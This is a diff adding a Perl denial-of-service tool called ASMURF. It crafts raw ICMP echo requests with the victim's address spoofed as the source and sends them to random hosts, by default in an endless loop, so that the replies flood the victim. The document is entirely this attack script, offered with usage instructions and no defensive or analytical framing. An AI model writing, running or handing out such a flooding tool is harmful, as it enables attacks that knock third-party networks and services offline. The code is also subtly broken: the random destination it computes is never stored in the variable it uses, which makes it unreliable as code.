@@ -1,0 +1,50 @@
+#!/usr/bin/perl
+
+use Net::RawIP;
+use Getopt::Std;
+
+getopts('d:n:t:s:', \%opt)||usage();
+if(defined($opt{'d'})) { $target=$opt{'d'} } else { $xcount=1; usage() }
+if(defined($opt{'n'})) { $count=$opt{'n'} } else { $count=0 }
+if(defined($opt{'t'})) { $ttl=$opt{'t'} } else { $ttl=64 }
+if(defined($opt{'s'})) { $tos=$opt{'s'} } else { $tos=0 }
+
+for(0;$ncount<($count+1);$ncount++) {
+$pcount++;
+if($count==0) { $ncount-- }
+randip;
+print("Packet: $pcount\n");
+print("Sending echo request from $target to $randip.\n");
+print("TTL: $ttl  TOS: $tos\n\n");
+$packet = new Net::RawIP ({icmp =>{}});
+$packet->set({ip  =>  { saddr    => $target,
+                        daddr    => $randip,
+                        ttl      => $ttl,
+                        protocol => 1,
+                        tos      => $tos
+                      },
+              icmp => { type     => 8 }
+            });
+$packet->send;
+}
+
+
+sub usage() {
+    $0=~s#.*/##g;
+    print("\nASMURF - Programmed by Anarchy\n");
+    print("-------------------------------\n");
+    print("Usage  :  ASMURF -d <dest ip> [options]\n");
+    print("Options:  -n <number of packets to send>  (default=0, 0=loop)\n");
+    print("          -t <Time To Live (TTL)          (default=64)\n");
+    print("          -s <Type Of Service (TOS)       (default=0)\n\n");
+  
+$xcount==1 && print("Error: Need a destination ip !!!\n\n");
+    exit 0;
+}
+
+sub randip() {
+   srand;
+   return $saddr=(int rand 255).".".(int rand 255).".".(int rand 255).".".(int rand 255);
+}
+
+
